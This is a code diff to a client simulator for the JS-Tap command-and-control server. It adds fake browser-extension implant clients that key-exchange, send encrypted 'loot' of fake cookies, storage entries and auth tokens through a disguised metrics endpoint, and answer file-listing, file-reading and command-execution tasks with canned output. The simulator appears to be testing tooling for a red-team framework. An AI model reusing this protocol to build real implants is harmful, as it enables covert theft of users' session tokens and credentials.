@@ -16,6 +16,10 @@ import random
 import sys
 import time
 
+from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
+from cryptography.hazmat.primitives import hashes, serialization
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
 
 # ── User-Agent strings ─────────────────────────────────────────────────────────
 
@@ -129,6 +133,106 @@ FAKE_XHR_CALLS = [
     },
 ]
 
+# ── Fake beacon data pools ────────────────────────────────────────────────────
+
+FAKE_BEACON_DOMAINS = [
+    "pizzatracker.biz",
+    "catfacts.lol",
+    "wizard-supplies.net",
+    "not-a-virus.download",
+    "free-robux.gg",
+    "definitely-legit-bank.com",
+    "flat-earth-proof.org",
+    "crypto-moon-lambo.io",
+    "grandmas-secret-recipes.co",
+    "area51-tours.travel",
+]
+
+FAKE_BEACON_PATHS = {
+    "pizzatracker.biz":          ["/track/order/42", "/menu/extra-cheese", "/coupons/BOGO", "/delivery-status"],
+    "catfacts.lol":              ["/fact/daily", "/subscribe?confirm=yes", "/unsubscribe/impossible", "/gallery/chonkers"],
+    "wizard-supplies.net":       ["/wands/elder", "/potions/invisibility", "/robes/sale", "/checkout"],
+    "not-a-virus.download":      ["/totally-safe.exe", "/free-antivirus", "/toolbar-install", "/scan-results"],
+    "free-robux.gg":             ["/generate?amount=99999", "/verify-human", "/survey/complete", "/download-hack"],
+    "definitely-legit-bank.com": ["/login", "/account/transfer", "/admin/dashboard", "/api/v1/accounts"],
+    "flat-earth-proof.org":      ["/evidence", "/nasa-lies", "/dome-theory", "/join-the-movement"],
+    "crypto-moon-lambo.io":      ["/ico/presale", "/wallet/connect", "/stake/all-in", "/roadmap"],
+    "grandmas-secret-recipes.co":["/cookies/chocolate-chip", "/casserole/surprise", "/meatloaf/classic", "/life-story-before-recipe"],
+    "area51-tours.travel":       ["/book-tour", "/alien-gift-shop", "/restricted-zone", "/ufo-sightings"],
+}
+
+FAKE_BEACON_COOKIES = [
+    ("session_id", "xK9mZp2qR7wN4vTy", '{"httpOnly": true, "secure": true, "sameSite": "Strict", "path": "/"}'),
+    ("auth_token", "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoic3VwZXIifQ.fakesig", '{"httpOnly": false, "secure": true, "sameSite": "Lax"}'),
+    ("tracking_id", "ua-777-pizza-lover-42", '{"httpOnly": false, "secure": false, "sameSite": "None"}'),
+    ("preferences", "theme=dark&lang=en&pizza=yes", '{"httpOnly": false, "secure": false, "sameSite": "Lax", "path": "/settings"}'),
+    ("admin_flag", "is_admin=true; role=superuser", '{"httpOnly": true, "secure": true, "sameSite": "Strict"}'),
+    ("_csrf", "d3f1n1t3ly-n0t-gu3ss4bl3", '{"httpOnly": true, "secure": true, "sameSite": "Strict"}'),
+    ("remember_me", "base64(user:wizardadmin)", '{"httpOnly": false, "secure": true, "sameSite": "Lax", "expires": "2099-12-31"}'),
+]
+
+FAKE_BEACON_LOCAL_STORAGE = [
+    ("user_profile", '{"name": "Gandalf", "role": "wizard", "level": 99}'),
+    ("api_key", "sk-live-n0t-4-pr0duct10n-us3-pl34s3"),
+    ("feature_flags", '{"darkMode": true, "betaAccess": true, "secretMenu": true}'),
+    ("cached_credentials", '{"username": "admin", "hash": "5f4dcc3b5aa765d61d8327deb882cf99"}'),
+    ("app_state", '{"lastPage": "/dashboard", "cart": ["wand", "potion", "robe"]}'),
+]
+
+FAKE_BEACON_SESSION_STORAGE = [
+    ("temp_token", "tmp_9x8w7v6u5t4s3r2q1p"),
+    ("form_draft", '{"to": "accounts@bank.com", "amount": "$1,000,000", "memo": "totally normal"}'),
+    ("search_history", '["password reset", "how to hack", "delete browser history"]'),
+    ("checkout_step", '{"step": 3, "payment": "crypto", "shipping": "overnight"}'),
+]
+
+FAKE_BEACON_HEADERS = [
+    ("Authorization", "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IldpemFyZCBBZG1pbiJ9.fakesig"),
+    ("X-API-Key", "prod-key-d0nt-sh4r3-th1s-0n3"),
+    ("X-Internal-Token", "internal-microservice-secret-abc123"),
+    ("X-Forwarded-For", "192.168.1.42, 10.0.0.1"),
+    ("Cookie", "session=abc123; admin=true; debug=on"),
+    ("X-Custom-Auth", "HMAC-SHA256:timestamp:nonce:signature"),
+]
+
+FAKE_SIDECAR_RESPONSES = {
+    "list_dir": {
+        "path": "/home/wizard",
+        "contents": [
+            "passwords.txt", "secret_plans.docx", ".ssh/", "bitcoin_wallet.dat",
+            "totally_not_malware.exe", "grandmas_recipes_BACKUP.zip",
+            "world_domination_checklist.md", "browser_history_DO_NOT_OPEN/",
+        ],
+    },
+    "read_file": {
+        "content": (
+            "TOP SECRET - OPERATION PIZZA PARTY\n"
+            "================================\n"
+            "The treasure is buried under the third pizza oven.\n"
+            "WiFi password: correct-horse-battery-staple\n"
+            "Admin password: hunter2\n"
+            "Launch codes: up up down down left right left right B A\n"
+        ),
+    },
+    "exec_cmd": {
+        "output": (
+            "uid=1000(wizard) gid=1000(wizard) groups=1000(wizard),27(sudo),1337(hackers)\n"
+            "Linux wizard-tower 6.1.0-wizardOS #1 SMP PREEMPT_DYNAMIC x86_64\n"
+            "  PID TTY          TIME CMD\n"
+            " 1337 pts/0    00:00:42 definitely-not-a-backdoor\n"
+            " 9001 pts/1    00:13:37 crypto-miner --stealth\n"
+        ),
+    },
+}
+
+# ── Beacon client profiles ────────────────────────────────────────────────────
+
+BEACON_PROFILES = [
+    {"count": 2, "tag": "internal", "user_agent": LINUX_CHROME_UA,  "label": "Bex/Lin/Chrome"},
+    {"count": 2, "tag": "internal", "user_agent": WIN_CHROME_UA,    "label": "Bex/Win/Chrome"},
+    {"count": 1, "tag": "",         "user_agent": MAC_SAFARI_UA,    "label": "Bex/Mac/Safari"},
+]
+
 # ── Screenshot data ────────────────────────────────────────────────────────────
 
 SCREENSHOT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "clientSimulatorScreenshot.png")
@@ -145,6 +249,7 @@ class SimClient:
         self.server = server.rstrip("/")
         self.uuid = None
         self.payloads_received = []  # list of label strings
+        self.client_type = "app"
 
     @property
     def uuid_short(self):
@@ -287,6 +392,281 @@ class SimClient:
             pass
 
 
+# ── SimBeaconClient ───────────────────────────────────────────────────────────
+
+class SimBeaconClient:
+    """Simulates a bex-beacon browser extension client with encrypted comms."""
+
+    def __init__(self, index, label, tag, user_agent, server):
+        self.index = index
+        self.label = label
+        self.tag = tag
+        self.user_agent = user_agent
+        self.server = server.rstrip("/")
+        self.uuid = None
+        self.send_key = None     # AES key for encrypting outgoing messages
+        self.receive_key = None  # AES key for decrypting incoming responses
+        self.sidecar_commands = []  # list of label strings for received commands
+        self.client_type = "bex"
+
+    @property
+    def uuid_short(self):
+        if not self.uuid:
+            return "--------"
+        return f"{self.uuid[:4]}..{self.uuid[-4:]}"
+
+    @property
+    def payloads_received(self):
+        """Alias so StatusGrid can treat both client types uniformly."""
+        return self.sidecar_commands
+
+    async def register(self, session):
+        tag_path = f"/{self.tag}" if self.tag else ""
+        url = f"{self.server}/client/getToken{tag_path}/bex-beacon"
+        headers = {"User-Agent": self.user_agent}
+        try:
+            async with session.get(url, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self.uuid = data["clientToken"]
+                else:
+                    print(f"  [!] Beacon {self.index} registration failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Beacon {self.index} registration error: {e}")
+
+    async def key_exchange(self, session):
+        if not self.uuid:
+            return
+
+        # Generate RSA-OAEP 2048-bit keypair
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        public_key = private_key.public_key()
+
+        # Export public key as DER/SPKI, base64-encode
+        pub_der = public_key.public_bytes(
+            encoding=serialization.Encoding.DER,
+            format=serialization.PublicFormat.SubjectPublicKeyInfo,
+        )
+        pub_b64 = base64.b64encode(pub_der).decode("utf-8")
+
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/keyExchange/{self.uuid}"
+
+        try:
+            async with session.post(url, json={"publicKey": pub_b64}, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if data.get("enable") == "true":
+                        encrypted_keys_b64 = data["encryptedKeys"]
+                        encrypted_keys = base64.b64decode(encrypted_keys_b64)
+                        # Decrypt with RSA-OAEP SHA-256
+                        plaintext = private_key.decrypt(
+                            encrypted_keys,
+                            asym_padding.OAEP(
+                                mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
+                                algorithm=hashes.SHA256(),
+                                label=None,
+                            ),
+                        )
+                        # First 32 bytes = client's send key (server's receiveKey)
+                        # Next 32 bytes = client's receive key (server's sendKey)
+                        self.send_key = plaintext[:32]
+                        self.receive_key = plaintext[32:64]
+                    else:
+                        print(f"  [!] Beacon {self.index} encryption not enabled by server")
+                else:
+                    print(f"  [!] Beacon {self.index} key exchange failed: HTTP {resp.status}")
+        except Exception as e:
+            print(f"  [!] Beacon {self.index} key exchange error: {e}")
+
+    async def _send_encrypted(self, session, path, message_dict):
+        """Encrypt and send a message through the metrics endpoint."""
+        if not self.uuid or not self.send_key:
+            return None
+
+        iv = os.urandom(12)
+        aesgcm = AESGCM(self.send_key)
+
+        path_ct = aesgcm.encrypt(iv, path.encode("utf-8"), None)
+        msg_ct = aesgcm.encrypt(iv, json.dumps(message_dict).encode("utf-8"), None)
+
+        iv_b64 = base64.b64encode(iv).decode("utf-8")
+        path_b64 = base64.b64encode(path_ct).decode("utf-8")
+        msg_b64 = base64.b64encode(msg_ct).decode("utf-8")
+
+        payload = {"metricData": f"{iv_b64},{path_b64},{msg_b64}"}
+        headers = {"User-Agent": self.user_agent}
+        url = f"{self.server}/client/metrics/{self.uuid}"
+
+        try:
+            async with session.post(url, json=payload, headers=headers, ssl=False) as resp:
+                if resp.status == 200:
+                    ct = resp.content_type or ""
+                    if "json" in ct:
+                        return await resp.json()
+                return None
+        except Exception:
+            return None
+
+    async def send_loot_round(self, session):
+        if not self.uuid or not self.send_key:
+            return
+
+        # Pick 1-3 random domains
+        domains = random.sample(FAKE_BEACON_DOMAINS, random.randint(1, 3))
+
+        for domain in domains:
+            # Build full URL
+            paths = FAKE_BEACON_PATHS.get(domain, ["/"])
+            path = random.choice(paths)
+            full_url = f"https://{domain}{path}"
+
+            # Send visit report
+            await self._send_encrypted(session, "/bex/report", {
+                "visits": [{"domain": domain, "url": full_url}],
+            })
+
+            # Send 1-2 cookie captures
+            for name, value, metadata in random.sample(FAKE_BEACON_COOKIES, random.randint(1, 2)):
+                await self._send_encrypted(session, "/bex/capture", {
+                    "domain": domain,
+                    "type": "cookie",
+                    "name": name,
+                    "value": value,
+                    "url": full_url,
+                    "metadata": metadata,
+                })
+
+            # Send 1 localStorage capture
+            key, value = random.choice(FAKE_BEACON_LOCAL_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "local_storage",
+                "name": key,
+                "value": value,
+                "url": full_url,
+            })
+
+            # Send 1 sessionStorage capture
+            key, value = random.choice(FAKE_BEACON_SESSION_STORAGE)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "session_storage",
+                "name": key,
+                "value": value,
+                "url": full_url,
+            })
+
+            # Send 1 header capture
+            hdr_name, hdr_value = random.choice(FAKE_BEACON_HEADERS)
+            await self._send_encrypted(session, "/bex/capture", {
+                "domain": domain,
+                "type": "header",
+                "name": hdr_name,
+                "value": hdr_value,
+                "url": full_url,
+            })
+
+        # Report sidecar available
+        await self._send_encrypted(session, "/bex/sidecar/status", {"available": True})
+
+    async def poll_tasks(self, session):
+        """Poll for tasks via encrypted channel. Returns list of label strings."""
+        if not self.uuid or not self.send_key:
+            return []
+
+        resp_data = await self._send_encrypted(session, "/client/taskCheck", {})
+        if not resp_data:
+            return []
+
+        new_labels = []
+
+        # Response is {"metricData": "base64(iv),base64(ciphertext)"}
+        metric_data = resp_data.get("metricData")
+        if not metric_data:
+            return []
+
+        parts = metric_data.split(",")
+        if len(parts) != 2:
+            return []
+
+        try:
+            iv = base64.b64decode(parts[0])
+            ciphertext = base64.b64decode(parts[1])
+            aesgcm = AESGCM(self.receive_key)
+            plaintext = aesgcm.decrypt(iv, ciphertext, None)
+            tasks = json.loads(plaintext.decode("utf-8"))
+        except Exception:
+            return []
+
+        if not isinstance(tasks, list):
+            return []
+
+        for task in tasks:
+            code_b64 = task.get("data", "")
+            try:
+                code_bytes = base64.b64decode(code_b64)
+                code_text = code_bytes.decode("utf-8", errors="replace")
+            except Exception:
+                code_text = code_b64
+
+            # Try to parse as JSON to detect sidecar commands
+            try:
+                task_json = json.loads(code_text)
+                if task_json.get("type") == "SIDECAR_COMMAND":
+                    label = self._handle_sidecar_command(session, task_json)
+                    new_labels.append(label)
+                    self.sidecar_commands.append(label)
+                    # Send sidecar result asynchronously
+                    await self._send_sidecar_result(session, task_json)
+                    continue
+            except (json.JSONDecodeError, TypeError):
+                pass
+
+            # Not a sidecar command — treat as custom payload, ACK it
+            label = SimClient._extract_label(code_text)
+            new_labels.append(label)
+            self.sidecar_commands.append(label)
+            await self._ack_payload(session, code_text)
+
+        return new_labels
+
+    def _handle_sidecar_command(self, session, task_json):
+        """Extract a display label from a sidecar command task."""
+        cmd = task_json.get("command", "unknown")
+        args = task_json.get("args", {})
+        if cmd == "list_dir":
+            return f"list_dir {args.get('path', '/')}"
+        elif cmd == "read_file":
+            return f"read_file {args.get('filename', '?')}"
+        elif cmd == "exec_cmd":
+            return f"exec_cmd: {args.get('code', '?')}"
+        return f"sidecar: {cmd}"
+
+    async def _send_sidecar_result(self, session, task_json):
+        """Send a fake sidecar result back to the server."""
+        cmd = task_json.get("command", "unknown")
+        request_id = task_json.get("requestId", "")
+        fake_data = FAKE_SIDECAR_RESPONSES.get(cmd, {"output": "command completed"})
+        await self._send_encrypted(session, "/bex/sidecar/result", {
+            "requestId": request_id,
+            "command": cmd,
+            "success": True,
+            "data": fake_data,
+            "error": "",
+        })
+
+    async def _ack_payload(self, session, payload_code):
+        """ACK a received payload via encrypted customData endpoint."""
+        snippet = payload_code[:80].replace("\n", " ")
+        note_b64 = base64.b64encode(b"SimAck").decode()
+        data_b64 = base64.b64encode(f"Received: {snippet}".encode()).decode()
+        await self._send_encrypted(session, "/loot/customData", {
+            "note": note_b64,
+            "data": data_b64,
+        })
+
+
 # ── StatusGrid ─────────────────────────────────────────────────────────────────
 
 class StatusGrid:
@@ -301,25 +681,25 @@ class StatusGrid:
             sys.stdout.write(f"\033[{self._lines_printed}A\033[J")
 
         lines = []
-        bar = "\u2550" * 71
-        thin = "\u2500" * 71
+        bar = "\u2550" * 80
+        thin = "\u2500" * 80
 
         total_payloads = sum(len(c.payloads_received) for c in self.clients)
         registered = sum(1 for c in self.clients if c.uuid)
 
         lines.append(f"\u2550{bar}")
-        lines.append(f"  JS-Tap Client Simulator{' ' * 24}{registered} clients registered")
+        lines.append(f"  JS-Tap Client Simulator{' ' * 33}{registered} clients registered")
         lines.append(f"\u2550{bar}")
-        lines.append(f"  {'#':>2}  {'Label':<14} {'Tag':<7} {'UUID':<12} Payloads Received")
+        lines.append(f"  {'#':>2}  {'Type':<5} {'Label':<14} {'Tag':<9} {'UUID':<12} Payloads / Sidecar Cmds")
         lines.append(f" \u2500{thin}")
 
         for c in self.clients:
+            ctype = getattr(c, "client_type", "app")
             payloads_str = ", ".join(c.payloads_received) if c.payloads_received else ""
-            # Truncate if too long
-            if len(payloads_str) > 40:
-                payloads_str = payloads_str[:37] + "..."
+            if len(payloads_str) > 36:
+                payloads_str = payloads_str[:33] + "..."
             lines.append(
-                f"  {c.index:>2}  {c.label:<14} {c.tag:<7} {c.uuid_short:<12} {payloads_str}"
+                f"  {c.index:>2}  {ctype:<5} {c.label:<14} {c.tag:<9} {c.uuid_short:<12} {payloads_str}"
             )
 
         lines.append(f" \u2500{thin}")
@@ -334,8 +714,8 @@ class StatusGrid:
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 
-def build_clients(server):
-    """Build the list of SimClient instances from CLIENT_PROFILES."""
+def build_clients(server, include_beacons=True):
+    """Build the list of SimClient and SimBeaconClient instances."""
     clients = []
     idx = 1
     for profile in CLIENT_PROFILES:
@@ -348,6 +728,19 @@ def build_clients(server):
                 server=server,
             ))
             idx += 1
+
+    if include_beacons:
+        for profile in BEACON_PROFILES:
+            for _ in range(profile["count"]):
+                clients.append(SimBeaconClient(
+                    index=idx,
+                    label=profile["label"],
+                    tag=profile["tag"],
+                    user_agent=profile["user_agent"],
+                    server=server,
+                ))
+                idx += 1
+
     return clients
 
 
@@ -361,9 +754,11 @@ async def main():
                         help="Seconds between payload polls (default: 3)")
     parser.add_argument("--no-loot", action="store_true",
                         help="Register and poll only, skip sending fake loot")
+    parser.add_argument("--no-beacons", action="store_true",
+                        help="Skip beacon clients, only run app (js-implant) clients")
     args = parser.parse_args()
 
-    clients = build_clients(args.server)
+    clients = build_clients(args.server, include_beacons=not args.no_beacons)
     grid = StatusGrid(clients)
 
     print(f"\n  Registering {len(clients)} clients with {args.server} ...\n")
@@ -377,7 +772,17 @@ async def main():
             print("  [!] No clients registered. Is the server running?")
             return
 
-        print(f"  {registered}/{len(clients)} clients registered.\n")
+        print(f"  {registered}/{len(clients)} clients registered.")
+
+        # Key exchange for beacon clients
+        beacon_clients = [c for c in clients if isinstance(c, SimBeaconClient) and c.uuid]
+        if beacon_clients:
+            print(f"  Running key exchange for {len(beacon_clients)} beacon client(s)...")
+            await asyncio.gather(*(c.key_exchange(session) for c in beacon_clients))
+            keyed = sum(1 for c in beacon_clients if c.send_key)
+            print(f"  {keyed}/{len(beacon_clients)} beacon key exchanges completed.\n")
+        else:
+            print()
 
         grid.render()
 
